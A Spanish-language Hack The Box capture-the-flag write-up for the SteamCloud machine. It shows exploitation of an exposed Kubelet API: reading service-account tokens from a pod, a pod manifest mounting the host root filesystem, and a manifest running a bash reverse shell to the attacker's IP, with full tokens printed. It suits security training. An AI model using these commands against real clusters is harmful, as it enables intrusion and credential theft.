---
title: SteamCloud Writeup
author: xdann1
date: 2022-04-20
categories: [Writeup, HTB]
tags: [Linux, CTF, Kubernetes, Easy, Cloud, RCE]
image:
  path: ../../assets/img/commons/steamcloud/steamcloud.png
  width: 800
  height: 500
  alt: Banner Steamcloud
---

Máquina Easy, encontramos un contenedor en kubernetes vulnerable a un RCE, nos aprovechamos que podemos crear pods para hacer uno desde la raiz de archivos de esta forma consiguiendo leer archivos necesarios para mandarnos una reverse shell como root.

## Recopilación de Información

Primero vamos a comprobar la conectividad con la máquina.

```console
❯ ping -c 1 10.10.11.133
PING 10.10.11.133 (10.10.11.133) 56(84) bytes of data.
64 bytes from 10.10.11.133: icmp_seq=1 ttl=63 time=41.5 ms

--- 10.10.11.133 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 41.518/41.518/41.518/0.000 ms
```

En la salida del comando anterior se puede ver un parametro llamado `ttl`, gracias a este parametro podemos saber que sistema operativo está corriendo en la máquina víctima.
* GNU/Linux = TTL 64 
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.

Vamos a usar la herramienta `nmap` para descubrir que puertos estan abiertos y que servicios estan asociados a estos.

```console
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.133 -oG allPorts
```

* -p- > Escanea todos los puertos (65535)
* --open > Muestra solo los puertos con un estatus "open"
* -sS > Aplica un TCP SYN Scan
* --min-rate 5000 > Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv > Muestra la información en pantalla a medida que se descubre
* -n > Indica que no aplique resolución DNS
* -Pn > Indica que no aplique el protocolo ARP
* 10.10.10.11.133 > Dirección IP que se quiere escanear
* -oG allPorts > Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del comando

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 22:13 CET
Scanning 10.10.11.133 [65535 ports]
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack zsh:1: command not found: ttl
ttl 63
80/tcp   open  http        syn-ack ttl 63
2380/tcp open  etcd-server syn-ack ttl 63
8443/tcp open  https-alt   syn-ack ttl 63
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```console
❯ nmap -p22,80,2380,8443 -sC -sV 10.10.11.133 -oN targeted
```

* -p22,80,2380,8443 > Indica los puertos que se quieren escanear, en este caso el 22, 80, 2380 y 8443
* -sC > Lanza scripts básicos de enumeración
* -sV > Enumera la versión y servicio que está corriendo en los puertos
* 10.10.10.133 > Dirección IP que se quiere escanear
* -oN targeted > Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del comando:

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-20 23:20 CET
Nmap scan report for 10.10.11.133

PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
80/tcp   open  http             nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
2380/tcp open  ssl/etcd-server?
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Not valid before: 2022-02-18T06:07:47
|_Not valid after:  2023-02-18T06:07:47
|_ssl-date: TLS randomness does not represent time
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: eeb68a72-4592-4223-9d3c-2ce2d188946c
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 8d512b1b-c9d1-48ff-89fd-f8bad492b299
|     X-Kubernetes-Pf-Prioritylevel-Uid: 77d1019f-b812-40a4-a4c6-c46d9794dba2
|     Date: Sun, 20 Feb 2022 22:38:13 GMT
|     Content-Length: 212
					---SKIP---
```

Los puertos abiertos y sus servicios asocidados son:

* 22/tcp > ssh
* 80/tcp > http
* 2380/tcp > ssl/etcd-server
* 8443/tcp > ssl/https-alt

# Busqueda de vulnerabilidades

Si analizamos los servicios web que alojan los puertos 80 y 8443 veremos que el 80 aloja una página web básica de nginx y el 8443 aloja otra en la que podemos ver que se esta usando kubernetes y que existe un usuario llamado "anonymous".

**¿Qué es Kubernetes?**

Kubernetes es una plataforma de código abierto para administrar cargas de trabajo y servicios. Utilizando un entorno de administración enfocado en contenedores. 

Disponen de su propia herramienta `kubectl`, por lo que intento autenticarme con el usuario "anonymous" intentando además conseguir un poco de información sobre el cluster pero necesita una contraseña.

```console
❯ kubectl --server https://10.10.11.133:8443 cluster-info
Please enter Username: anonymous
Please enter Password:
```

Buscando acerca de Kubernetes encontré una herramienta en github llamada "Kubeletctl", la podeis ver en el siguiente [repositorio](https://github.com/cyberark/kubeletctl). Kubeletctl es una herramienta de línea de comando que implementa la API de Kubelet.

Kubeletctl nos permite mostrar los pods del servidor de Kubernetes.

```console
❯ kubeletctl pods -s 10.10.11.133
```

* pods > Muestra la lista de pods 
* -s 10.10.11.133 > Indica la dirección IP del servidor

Obtenemos toda esta lista de pods del servidor

```console
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-proxy-fkss9                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ coredns-78fcd69978-mfjfc           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 9 │ michaelserra                       │ default     │ michaelserra            │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

También permite escanear el servidor en busqueda de containers vulnerables a RCE.

```console
❯ kubeletctl scan rce -s 10.10.11.133
```

* scan rce > Escanea los nodos de la API de Kubelet con la vulnerabilidad RCE. 
* -s 10.10.11.133 > Indica la dirección IP del servidor 

El output nos muestra cuales son los containers vulnerables a un RCE

```console
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ kube-proxy-fkss9                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ coredns-78fcd69978-mfjfc           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ michaelserra                       │ default     │ michaelserra            │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 9 │              │ nginx                              │ default     │ nginx                   │ +   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

# Explotación

Ya sabiendo que containers son vulnerables a un RCE podemos elegir el que queramos y ejecutar comandos en el, en este caso yo he utilizado el nginx.

```console
❯ kubeletctl run "id" -p nginx -c nginx -s 10.10.11.133
```

* run "id" > Indica el comando que vas a querer ejecutar
* -p nginx > Indica el POD
* -c nginx > Indica el container 
* -s 10.10.11.133 > Indica la dirección IP del servidor

Sorprendentemente estamos ejecutando comandos como el usuario root

```console
uid=0(root) gid=0(root) groups=0(root)
```

Podemos ver la flag del usuario 

```console
❯ kubeletctl run "cat /root/user.txt" -p nginx -c nginx -s 10.10.11.133
705ad31f80c6532b****************
```

# Post-explotación

Investigando un poco me encontré con este [post](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration) de HackTricks. En él indica que existe un objeto llamado "ServiceAccount" que es el que le proporciona un ID a un proceso que se este ejecutando dentro de un POD, este objeto es manejado automaticamente por Kubernetes, por lo que cuando no se le proporciona el atributo "ServiceAccount" al crear un nuevo POD se asigna en unos directorios predeterminados.

Estos directorios son:
* /run/secrets/kubernetes.io/serviceaccount
* /var/run/secrets/kubernetes.io/serviceaccount
* /secrets/kubernetes.io/serviceaccount

Todos estos directorios tienen unos archivos en común:

* ca.crt > Certificado que comprueba las comunicaciones de Kubernetes
* namespace > Indica la configuración de nombres actual
* token > Contiene el token del POD actual

Para poder autenticarnos contra el cluster solamente necesitamos los archivos `ca.crt` y `token`. Vamos a guardarnos ambos archivos en local.

```console
❯ kubeletctl run "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx -s 10.10.11.133 > ca.crt
❯ kubeletctl run "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx -s 10.10.11.133 > token
```

En el siguiente [post](https://kubernetes.io/docs/reference/access-authn-authz/authentication/) viene explicada la autenticación en Kubernetes.

```console
❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlVhbHFtQWtCZjJuN0hwMUJ2djFaVm85ekRxamhCcHV4bGcxLWtEdnhWSmMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3MTMyNDIxLCJpYXQiOjE2NDU1OTY0MjEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjZlYjE0ZTZjLTAwNWUtNDcxYi05NTUzLTE4MTY5N2FlYzhhNCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjQyMTI4YTY2LTUyYjctNDFhZi1hMjY3LWJiYTFkNGU3MzFlZCJ9LCJ3YXJuYWZ0ZXIiOjE2NDU2MDAwMjh9LCJuYmYiOjE2NDU1OTY0MjEsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.inJpZWoQ4ZR4l4PGJSXmlIz_uEt0-D_3r-DMyksyxmMNAKaNWHzd4GhCwSuw0r1XugTQymm0opbw4CFVizQ07QeFJCx0uL2kNbrz3o70OPU1yycCDsYjudzQu-8JfA7-LB4F3WDiZbWtFlYNnAHiVhJo4O3IBhfikQXHEDKptrMTQHSSbOq8ud2OBIYXq_ZVEqX6gaiAXMLOi-oNKB1NUzdmqJXUYpZYsIUCRc_kmQDLXhZn0JTWdqLHaqiCIlg65c2HI9Iz52hv3LRGmDTL7xrLvgp8v5q8iuO-TRXilrc1qeBdKVbuCC_Gbe92-FhqYwgOzh5LlrYcLHxD9ePsWQ get pod
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          15m
```

* --server https://10.10.11.133:8443 > Indica la dirección URL del servidor
* --certificate-authority=ca.crt > Indica la ruta del certicado de las comunicaciones de Kubernetes
* --token=\<token\> > Indica el Token del POD
* get pod > Muestra información sobre el POD

 Si intentamos conseguir otra información como "cluser-info" no vamos a poder conseguirla porque no tenemos permisos

```console
❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3MzY2NTM3LCJpYXQiOjE2NDU4MzA1MzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4MzQxNDR9LCJuYmYiOjE2NDU4MzA1MzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.pp_KAAchJDZRkGdgknJ6VykWnbSfhXrwgBYZgyrC00Ma2UkzfeVAYXf0FrdBWMdQ2tkhPow8Fdr17KK41ZMmfUN73JjxDkmYqBD8kbJuru70SJUVRzQsxXCjL8BdvWprHSz7v7DNuhJtxZucD5tME2Yrr0Hv60d9C2k1hQcHoiAJ1sx92oXzhCRGbWeV9L4LTFlq8uDpPSzJWDx3_xeT44tGCL4uvoW9iTCEX5AoO9zjMivPS6Hsj_AYRQaghHfzbEo5hTC48LMrp43m1id6AyZ7kcg2ArIbN4GPPRRSnG6tH-huE5QijFgRhGp8mdJ6f-dH5x2wxGsLK97cPsZdQA cluster-info

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
Error from server (Forbidden): services is forbidden: User "system:serviceaccount:default:default" cannot list resource "services" in API group "" in the namespace "kube-system"
```

Kubectl tiene un comando llamado `auth can-i` que es utilizado para listar los permisos de la cuenta actual

```console
❯ kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3MzY2NTM3LCJpYXQiOjE2NDU4MzA1MzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4MzQxNDR9LCJuYmYiOjE2NDU4MzA1MzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.pp_KAAchJDZRkGdgknJ6VykWnbSfhXrwgBYZgyrC00Ma2UkzfeVAYXf0FrdBWMdQ2tkhPow8Fdr17KK41ZMmfUN73JjxDkmYqBD8kbJuru70SJUVRzQsxXCjL8BdvWprHSz7v7DNuhJtxZucD5tME2Yrr0Hv60d9C2k1hQcHoiAJ1sx92oXzhCRGbWeV9L4LTFlq8uDpPSzJWDx3_xeT44tGCL4uvoW9iTCEX5AoO9zjMivPS6Hsj_AYRQaghHfzbEo5hTC48LMrp43m1id6AyZ7kcg2ArIbN4GPPRRSnG6tH-huE5QijFgRhGp8mdJ6f-dH5x2wxGsLK97cPsZdQA
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
					---SKIP---
```

La línea que más nos importa es la tercera, en ella muestra que tenemos los permisos `get`, `create` y `list` sobre los pods. Gracias a que tenemos el permiso de listar podemos conseguir información sobre el pod actual.

```console
❯ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Mzg0MDc3LCJpYXQiOjE2NDU4NDgwNzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4NTE2ODR9LCJuYmYiOjE2NDU4NDgwNzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LDdoY3-pAoiJIuwESDlxYwb3oYLfUQnimhJ7SkQLVnVeAY_E4aTqCCFV7an8jtvJPJW5yBoQONA0HIWPEAp8quEJAiiOJb9SMdBFt5bTa8Lu5Fqdn_PiMo1YpVOlKPkdcM7QCcOPDapfjs-MYCJgE4_3E8UQd3pp2Q0p093FBjmebZaWHeew1PDQEsMUDPnJZhVUyyZmFtyYyxD5wrHb83QrvsV79X-VMHmKg0B3LQi26E4wM2oQ2eksEmBjUmt8CxE2-8Aky9QZv1ZmDlV5U7TCwXCJWslx7-kgtctqa749B2VLDzMjEroX70yz7mrSulKmCxM6E71jhkUl-cO0zA
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"nginx","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"path":"/opt/flag"},"name":"flag"}]}}
  creationTimestamp: "2022-02-25T06:07:01Z"
  name: nginx
  namespace: default
  resourceVersion: "519"
  uid: 24721c90-131b-4e36-942f-49a9bfdf674c
spec:
  containers:
  - image: nginx:1.14.2
    imagePullPolicy: Never
    name: nginx
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /root
      name: flag
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-zxdkw
      readOnly: true
					---SKIP---
```

Los datos más importantes son:

* namespace > default
* image > nginx:1.14.2

Procedemos a crear un nuevo pod que este montado en la raíz de los archivos, es decir, en "/". Cuando ejecutemos el pod tendremos acceso a todo el sistema de archivos.

```console
apiVersion: v1 
kind: Pod
metadata:
  name: xdann1
  namespace: default
spec:
  containers:
  - name: xdann1
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Primero tendremos que cargar el pod para luego poder ejecutarlo

```console
❯ kubectl apply -f xdann1.yaml  --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Mzg0MDc3LCJpYXQiOjE2NDU4NDgwNzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4NTE2ODR9LCJuYmYiOjE2NDU4NDgwNzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LDdoY3-pAoiJIuwESDlxYwb3oYLfUQnimhJ7SkQLVnVeAY_E4aTqCCFV7an8jtvJPJW5yBoQONA0HIWPEAp8quEJAiiOJb9SMdBFt5bTa8Lu5Fqdn_PiMo1YpVOlKPkdcM7QCcOPDapfjs-MYCJgE4_3E8UQd3pp2Q0p093FBjmebZaWHeew1PDQEsMUDPnJZhVUyyZmFtyYyxD5wrHb83QrvsV79X-VMHmKg0B3LQi26E4wM2oQ2eksEmBjUmt8CxE2-8Aky9QZv1ZmDlV5U7TCwXCJWslx7-kgtctqa749B2VLDzMjEroX70yz7mrSulKmCxM6E71jhkUl-cO0zA
pod/xdann1 created
```

Vamos a listar los pods existentes

```console
❯ kubeletctl scan rce -s 10.10.11.133
```
- scan rce > Escanea los nodos de la API de Kubelet con la vulnerabilidad RCE.
- -s 10.10.11.133 > Indica la dirección IP del servidor

```console
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ xdann1                             │ default     │ xdann1                  │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-proxy-9nvcj                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 9 │              │ coredns-78fcd69978-szddh           │ kube-system │ coredns                 │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

Ya podemos ver que se ha creado correctamente el pod, por lo que procedemos a ejecutar comandos sobre el.

```console
❯ kubeletctl run "pwd" -s 10.10.11.133 -p xdann1 -p xdann1 -c xdann1
```

Podemos leer la bandera de root

```console
❯ kubeletctl run "cat /mnt/root/root.txt" -s 10.10.11.133 -p xdann1 -p xdann1 -c xdann1
b8e39d9290d5c7******************
```

Ya tenemos todas las flags pero nos falta acceder a la máquina. Simplemente tendremos que crear un nuevo pod pero esta vez tendremos que hacer que ejecute una reverse shell cuando se cargue.

```console
apiVersion: v1
kind: Pod
metadata:
  name: reverse
  namespace: default
spec:
  containers:
  - name: reverse
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.14.246/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Nos ponemos en escucha

```console
❯ nc -nlvp 443
```

Cargamos el nuevo pod con la reverse-shell

```console
❯ kubectl apply -f reverse.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IlREdG5DSnBPR0p2N2Fiank0ckV6Z3B3YVN1TmZmeFRXVUN4SFFRcDF3WEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3Mzg0MDc3LCJpYXQiOjE2NDU4NDgwNzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjI0NzIxYzkwLTEzMWItNGUzNi05NDJmLTQ5YTliZmRmNjc0YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlOGU1ODgyLTkxODEtNDdjNC04NDhkLTM0NTkyNDVlY2Q1NyJ9LCJ3YXJuYWZ0ZXIiOjE2NDU4NTE2ODR9LCJuYmYiOjE2NDU4NDgwNzcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LDdoY3-pAoiJIuwESDlxYwb3oYLfUQnimhJ7SkQLVnVeAY_E4aTqCCFV7an8jtvJPJW5yBoQONA0HIWPEAp8quEJAiiOJb9SMdBFt5bTa8Lu5Fqdn_PiMo1YpVOlKPkdcM7QCcOPDapfjs-MYCJgE4_3E8UQd3pp2Q0p093FBjmebZaWHeew1PDQEsMUDPnJZhVUyyZmFtyYyxD5wrHb83QrvsV79X-VMHmKg0B3LQi26E4wM2oQ2eksEmBjUmt8CxE2-8Aky9QZv1ZmDlV5U7TCwXCJWslx7-kgtctqa749B2VLDzMjEroX70yz7mrSulKmCxM6E71jhkUl-cO0zA
pod/reverse created
```

Y ya hemos conseguido acceso a la máquina

```console
root@steamcloud:/# hostname
steamcloud
```
